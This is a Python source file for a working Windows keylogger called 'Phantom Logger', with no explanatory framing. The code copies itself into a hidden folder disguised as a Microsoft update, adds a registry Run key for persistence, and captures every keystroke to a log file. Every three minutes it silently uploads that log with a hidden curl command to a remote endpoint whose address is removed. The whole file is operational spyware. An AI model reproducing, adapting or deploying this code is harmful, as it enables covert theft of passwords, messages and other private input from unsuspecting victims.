import ctypes
import os
import shutil
import sys
import winreg
from pynput import keyboard
import threading
import time
from datetime import datetime
import subprocess

def add_to_startup(file_path=None):
    if file_path is None:
        file_path = os.path.abspath(sys.argv[0])

    key_name = "Phantom Logger"
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(reg_key)
    except Exception:
        pass


def move_to_hidden_location():
    hidden_dir = os.path.join(os.getenv("APPDATA"), "MicrosoftUpdate")
    os.makedirs(hidden_dir, exist_ok=True)

    dest_file = os.path.join(hidden_dir, "windows.exe")
    if not os.path.exists(dest_file):
        shutil.copy2(sys.argv[0], dest_file)
        add_to_startup(dest_file)

move_to_hidden_location()

log_file = os.path.join(os.getenv("APPDATA"), "MicrosoftUpdate", "keylog.txt")
key_buffer = []
lock = threading.Lock()
last_timestamp = 0

command = f'curl -F "file=@{log_file}" -F "content=Keylog Update" ***REMOVED***'  #Command

user32 = ctypes.WinDLL('user32', use_last_error=True)


def get_layout():
    hwnd = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(hwnd, 0)
    layout_id = user32.GetKeyboardLayout(thread_id)
    return layout_id


def key_to_unicode(vk_code):
    keyboard_state = (ctypes.c_ubyte * 256)()
    user32.GetKeyboardState(ctypes.byref(keyboard_state))

    buff = ctypes.create_unicode_buffer(8)
    layout = get_layout()

    result = user32.ToUnicodeEx(
        vk_code,
        user32.MapVirtualKeyExW(vk_code, 0, layout),
        keyboard_state,
        buff,
        len(buff),
        0,
        layout
    )

    return buff.value if result > 0 else ''


def write_keys_to_file():
    global key_buffer, last_timestamp
    while True:
        time.sleep(10)
        now = time.time()
        with lock:
            with open(log_file, "a", encoding="utf-8") as f:
                if now - last_timestamp >= 300:
                    now_dt = datetime.now()
                    day = now_dt.day
                    month = now_dt.month
                    year = now_dt.year
                    hour = now_dt.strftime("%I")
                    minute = now_dt.strftime("%M")
                    ampm = now_dt.strftime("%p")
                    current_time = f"{day}/{month}/{year} / {int(hour)}:{minute} {ampm}"
                    f.write(f"\n{current_time}\n")
                    last_timestamp = now
                if key_buffer:
                    f.write("".join(key_buffer))
                    key_buffer = []


#Do command
def run_command_periodically():
    while True:
        time.sleep(180)  # Upload every 3 minutes
        try:
            subprocess.run(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0)
        except Exception:
            # Network/upload failures are non-fatal; retry on next interval
            pass


def on_press(key):
    try:
        if hasattr(key, 'vk'):
            char = key_to_unicode(key.vk)
            if char:
                with lock:
                    key_buffer.append(char)
                return
        with lock:
            if key == keyboard.Key.space:
                key_buffer.append(" ")
            elif key == keyboard.Key.enter:
                key_buffer.append("\n")
            elif key == keyboard.Key.tab:
                key_buffer.append("\t")
            elif key == keyboard.Key.backspace:
                key_buffer.append("[BACKSPACE]")
            else:
                key_buffer.append(f"[{key.name.upper()}]")
    except Exception as e:
        with lock:
            key_buffer.append(f"[ERROR:{e}]")



writer_thread = threading.Thread(target=write_keys_to_file, daemon=True)
cmd_thread = threading.Thread(target=run_command_periodically, daemon=True)

writer_thread.start()
cmd_thread.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

